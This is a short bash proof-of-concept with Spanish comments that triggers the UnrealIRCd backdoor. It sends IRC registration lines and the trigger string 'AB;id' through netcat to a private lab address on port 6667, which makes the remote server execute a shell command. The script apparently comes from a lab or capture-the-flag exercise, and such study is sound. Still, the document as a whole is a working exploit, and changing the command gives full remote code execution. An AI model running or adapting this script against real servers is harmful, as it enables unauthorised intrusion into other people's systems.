#!/bin/bash
# PoC manual UnrealIRCd backdoor (intento)

# IP del objetivo
TARGET="192.168.56.102"

# Puerto IRC por defecto
PORT=6667

# Abrimos una conexión con netcat y enviamos comandos IRC
(
  # Enviamos un nombre de usuario ficticio
  printf "NICK pwn\r\n"

  # Enviamos información de usuario requerida por el protocolo IRC
  printf "USER pwn 0 * :pwn\r\n"

  # Esperamos un segundo para que el servidor procese
  sleep 1

  # Enviamos el payload malicioso: AB;id
  # "AB;" activa la backdoor, "id" se ejecuta como comando en el sistema remoto
  printf "AB;id\r\n"

  # Esperamos otro segundo para recibir la respuesta
  sleep 1
) | nc $TARGET $PORT
